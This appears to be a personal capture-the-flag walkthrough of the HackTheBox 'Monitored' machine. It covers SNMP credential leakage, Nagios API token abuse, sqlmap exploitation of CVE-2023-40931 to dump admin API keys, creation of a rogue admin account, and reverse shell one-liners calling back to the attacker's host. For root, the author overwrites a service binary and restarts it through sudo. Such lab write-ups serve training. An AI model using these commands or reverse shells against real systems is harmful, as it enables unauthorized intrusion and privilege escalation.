https://www.hackthebox.com/achievement/machine/1777380/583
About Monitored

Monitored is a medium-difficulty Linux machine that features a Nagios instance. Credentials for the service are obtained via the SNMP protocol, which reveals a username and password combination provided as command-line parameters. Using the Nagios API, an authentication token for a disabled account is obtained, which leads to access to the application&amp;#039;s dashboard. From there, a SQL injection (`[CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)`) is abused to obtain an administrator API key, with which a new admin account is created and used to run arbitrary commands on the instance, leading to a reverse shell. Finally, `sudo` access to a bash script is abused to read the `root` user&amp;#039;s SSH key and authenticate as `root`.

- **Credential Leakage** → SNMP exposes Nagios user credentials.
- **Authentication Bypass** → API allows login with a disabled account.
- **SQL Injection** → Dumps admin API keys and escalates privileges.
- **Remote Code Execution** → API command execution allows shell access.
- **Privilege Escalation** → Misconfigured sudo permissions expose root credentials.


IP=10.10.11.248
## Enumeration

```bash
──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.10.11.248 
ssh
http
ldap
https
  $ sudo nmap -sU -p- 10.10.11.248


```

```bash
nagios.monitored.htb
```

```bash
https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
```
-snmp port <> 161 udp
```bash
snmpwalk -v2c -c public 10.10.11.248
```

```bash
──(pwn㉿kali)-[~]
└─$ snmpbulkwalk -v2c -c public 10.10.11.248
faster it ran with threads
✅ **Usernames & Credentials**  
✅ **Running Processes & Command-Line Arguments**  
✅ **Open Network Ports & Services**  
✅ **System Information & Hostnames**  
✅ **Network Interfaces & ARP Tables**
```

```bash
sudo /etc/snmp/snmp.conf

uncomment
mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
```

**Management Information Base (MIBs)** is crucial for translating numerical **Object Identifiers (OIDs)** into human-readable names. By default, many SNMP tools (like `snmpwalk`, `snmpget`, and `snmptrap`) **do not load all available MIBs**, leading to output that only shows raw numeric OIDs.

```bash
┌──(pwn㉿kali)-[~]
└─$ sudo apt install snmp-mibs-downloader
```

## **TL;DR: Most Important OIDs to Enumerate**

|Target Data|OID|
|---|---|
|System Info & OS Version|`1.3.6.1.2.1.1.1.0`|
|Hostname|`1.3.6.1.2.1.1.5.0`|
|Running Processes|`1.3.6.1.2.1.25.4.2.1.2`|
|Open Ports|`1.3.6.1.2.1.6.13.1.3`|
|Network Interfaces|`1.3.6.1.2.1.2.2.1.2`|
|ARP Table|`1.3.6.1.2.1.4.22.1.2`|
|Users on System|`1.3.6.1.4.1.77.1.2.25`|

---

```bash
snmpbulkwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.1.1.0  # OS Version

snmpbulkwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.1.5.0  # Hostname

snmpbulkwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.25.4.2.1.2  # Running Processes

snmpbulkwalk -v2c -c public 10.10.11.248 1.3.6.1.4.1.77.1.2.25  # Users

snmpbulkwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.6.13.1.3  # Open Ports

snmpbulkwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.2.2.1.2  # Network Interfaces

snmpbulkwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.4.22.1.2  # ARP Table

```

### ** `hrSWRun` in SNMP (SNMP Running Software Table)**

What **IPSec** mentioned in his video was likely **`hrSWRun`** (Host Resources Software Running Table). This MIB is extremely useful in **pentesting/red teaming** because it lists **all running processes on the target system**, just like running `ps aux` on Linux.


```bash
┌──(pwn㉿kali)-[~]
└─$ snmpbulkwalk -v2c -c public 10.10.11.248 -m all >> snmp.txt

filter by nagios
```

```bash
┌──(pwn㉿kali)-[~]
└─$ cat snmp.txt | grep "SWRun" | grep "986"
HOST-RESOURCES-MIB::hrSWRunIndex.986 = INTEGER: 986
HOST-RESOURCES-MIB::hrSWRunName.986 = STRING: "nagios"
HOST-RESOURCES-MIB::hrSWRunID.986 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.986 = STRING: "/usr/local/nagios/bin/nagios"
HOST-RESOURCES-MIB::hrSWRunParameters.986 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
HOST-RESOURCES-MIB::hrSWRunType.986 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.986 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunPerfCPU.986 = INTEGER: 89
HOST-RESOURCES-MIB::hrSWRunPerfMem.986 = INTEGER: 14712 KBytes

```

```bash
┌──(pwn㉿kali)-[~]
└─$ cat snmp.txt | grep "SWRunName"         
sample:
HOST-RESOURCES-MIB::hrSWRunName.4386 = STRING: "cron"
HOST-RESOURCES-MIB::hrSWRunName.4387 = STRING: "sh"
HOST-RESOURCES-MIB::hrSWRunName.4388 = STRING: "php"
HOST-RESOURCES-MIB::hrSWRunName.4397 = STRING: "sleep"
HOST-RESOURCES-MIB::hrSWRunName.1423 = STRING: "bash"


```

```bash
──(pwn㉿kali)-[~]
└─$ cat snmp.txt | grep "4387"              
HOST-RESOURCES-MIB::hrSWRunIndex.4387 = INTEGER: 4387
HOST-RESOURCES-MIB::hrSWRunName.4387 = STRING: "sh"
HOST-RESOURCES-MIB::hrSWRunID.4387 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.4387 = STRING: "/bin/sh"
HOST-RESOURCES-MIB::hrSWRunParameters.4387 = STRING: "-c /usr/bin/php -q /usr/local/nagiosxi/cron/cmdsubsys.php >> /usr/local/nagiosxi/var/cmdsubsys.log 2>&1"
HOST-RESOURCES-MIB::hrSWRunType.4387 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.4387 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunPerfCPU.4387 = INTEGER: 0
HOST-RESOURCES-MIB::hrSWRunPerfMem.4387 = INTEGER: 576 KBytes

```

```bash
┌──(pwn㉿kali)-[~]
└─$ cat snmp.txt | grep "1423"
HOST-RESOURCES-MIB::hrSWRunIndex.1423 = INTEGER: 1423
HOST-RESOURCES-MIB::hrSWRunName.1423 = STRING: "bash"
HOST-RESOURCES-MIB::hrSWRunID.1423 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.1423 = STRING: "/bin/bash"
HOST-RESOURCES-MIB::hrSWRunParameters.1423 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
HOST-RESOURCES-MIB::hrSWRunType.1423 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.1423 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunPerfCPU.1423 = INTEGER: 5
HOST-RESOURCES-MIB::hrSWRunPerfMem.1423 = INTEGER: 3436 KBytes

```
-svc XjH7VCehowpR1xZB
sounds like credentials ?
-go back to the website
-try to login
The specified user account has been disabled or does not exist.>
-now its svc ? that mean it a service
-in the box about page 
```
 Using the Nagios API
```
-google it 'login Nagios API'
`https://support.nagios.com/forum/viewtopic.php?t=58783`
```bash
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'

```

```bash
curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
```
svc XjH7VCehowpR1xZB
- **Access the Nagios API** as `svc` without needing the password.
- **Query sensitive information** from the system.
- **Look for privilege escalation paths** (e.g., CVE-2023-40931, which affects the API).
```bash
┌──(pwn㉿kali)-[~]
└─$ curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "0c9d32c4feaf46f79c30967ff5e1cc4f653c89de",
    "valid_min": 5,
    "valid_until": "Thu, 06 Feb 2025 02:18:20 -0500"

```

```bash
https://nagios.monitored.htb/nagiosxi/?token=0c9d32c4feaf46f79c30967ff5e1cc4f653c89de
```
-won
## pre-exploitation
-Nagios XI 5.11.0 , revealed in the web page
-Nagios XI v5.11.0 - SQL Injection CVE-2023-40931
5bdei6u4eknue3l58dm8hudl17
-api=2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK
![[Pasted image 20250206103857.png]]

```bash
┌──(pwn㉿kali)-[~]
└─$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=5bdei6u4eknue3l58dm8hudl17" --batch --threads 10

tests if the `id` parameter is vulnerable to SQL injection by trying various payloads. If it finds a vulnerability, it confirms that SQL commands can be injected and executed.

┌──(pwn㉿kali)-[~]
└─$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=5bdei6u4eknue3l58dm8hudl17" --batch --threads 10 --dbs

list all the available databases on the target system. After confirming the SQL injection vulnerability


┌──(pwn㉿kali)-[~]
└─$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=5bdei6u4eknue3l58dm8hudl17" --batch --threads 10 -D nagiosxi --tables
---
focus on the database named `nagiosxi`
---

[22 tables]
+-----------------------------+
| xi_auditlog                 |
| xi_auth_tokens              |
| xi_banner_messages          |
| xi_cmp_ccm_backups          |
| xi_cmp_favorites            |
| xi_cmp_nagiosbpi_backups    |
| xi_cmp_scheduledreports_log |
| xi_cmp_trapdata             |
| xi_cmp_trapdata_log         |
| xi_commands                 |
| xi_deploy_agents            |
| xi_deploy_jobs              |
| xi_eventqueue               |
| xi_events                   |
| xi_link_users_messages      |
| xi_meta                     |
| xi_mibs                     |
| xi_options                  |
| xi_sessions                 |
| xi_sysstat                  |
| xi_usermeta                 |
| xi_users                    |
+-----------------------------+


---
dump the `xi_users` table:
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=5bdei6u4eknue3l58dm8hudl17" --batch --threads 10 -D nagiosxi -T xi_users --dump
```

---
```bash
user_id: 1  
email: admin@monitored.htb  
name: Nagios Administrator  
api_key: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL  
enabled: 1  
password: $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C  
username: nagiosadmin  
created_by: 0  
last_login: 1701931372  
api_enabled: 1  
last_edited: 1701427555  
created_time: 0  
last_attempt: 0  
backend_ticket: IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0  
last_edited_by: 5  
login_attempts: 0  
last_password_change: 1701427555  

---

user_id: 2  
email: svc@monitored.htb  
name: svc  
api_key: 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK  
enabled: 0  
password: $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK  
username: svc  
created_by: 1  
last_login: 1699724476  
api_enabled: 1  
last_edited: 1699728200  
created_time: 1699634403  
last_attempt: 1715201011  
backend_ticket: 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq  
last_edited_by: 1  
login_attempts: 7  
last_password_change: 1699697433  

```

-remember <> nagiosxi/api/v1 - we have token but how to login

https://www.exploit-db.com/exploits/51925
-interesting :
```bash
data = {"username": random_username, "password": random_password, "name": random_username, "email": f"{random_username}@mail.com", "auth_level": "admin"}
    r = requests.post(f'http://{IP}/nagiosxi/api/v1/system/user?apikey={adminKey}&pretty=1', data=data, verify=False)
```
admin key =IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL  

---
https://support.nagios.com/forum/viewtopic.php?f=6&t=40502
```
curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=xxx&pretty=1" -d "username=robertdeniro&password=test&name=Robert%20De%20Niro&email=robertdeniro@localhost&auth_level=admin&monitoring_contact=1"
{
    "success": "User account robertdeniro was added successfully!",
    "userid": "5"
```
-lets do it
```bash
┌──(pwn㉿kali)-[~]
└─$ curl -d "username=ahmad&password=ahmad&name=ahh&email=mad@monitored.htb&auth_level=admin&force_pw_change=0" -k 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'
{"success":"User account ahmad was added successfully!","user_id":6}

```
-username=ahmad&password=ahmad
-login in the page 

![[Pasted image 20250206110808.png]]- accept the license
-am `user:ahmad` as admin
-bash -c 'bash -i >& /dev/tcp/10.10.14.5/9997 0>&1'
	in the managment config pannel 
![[Pasted image 20250206111232.png]]
-i miss the .5 as its my vpn ip 
-add bash -c '..........'
-save it
-
![[Pasted image 20250206111354.png]]
-
![[Pasted image 20250206112047.png]]

![[Pasted image 20250206112442.png]]

![[Pasted image 20250206112516.png]]

## post-exploitation
```bash
sudo -l
(root) NOPASSWD: /etc/init.d/nagios restart

nagios@monitored:/$ cat /usr/local/nagiosxi/scripts/manage_services.sh
---
./manage_services.sh restart mysqld
./manage_services.sh checkconfig nagios
---


nagios@monitored:/$ ps -ef | grep nagios
---
/usr/local/nagios/bin/nagios
---
so if we replace bin with script it will execute it when we restart nagios.

in real word scenario we must avoid theis method as it miss with the service and with its availability

```

```bash
nagios@monitored:/$ cd /usr/local/nagios/bin/      
cd /usr/local/nagios/bin/
nagios@monitored:/usr/local/nagios/bin$ ls
ls
nagios
nagiostats
ndo.so
ndo-startup-hash.sh
npcd
npcdmod.o
nrpe
nrpe-uninstall
nsca
nagios@monitored:/usr/local/nagios/bin$ 

```

```bash
nagios@monitored:/usr/local/nagios/bin$ ls
nagios       nagios.save  ndo.so               npcd       nrpe            nsca
nagios2.bak  nagiostats   ndo-startup-hash.sh  npcdmod.o  nrpe-uninstall
nagios@monitored:/usr/local/nagios/bin$ cat nagios
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/9999 0>&1
nagios@monitored:/usr/local/nagios/bin$ 

```

```bash
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios2
```

```bash
┌──(pwn㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.248] 58506
bash: cannot set terminal process group (15539): Inappropriate ioctl for device
bash: no job control in this shell
root@monitored:/# ls

```


![[Pasted image 20250206125141.png]]

![[Pasted image 20250206125319.png]]

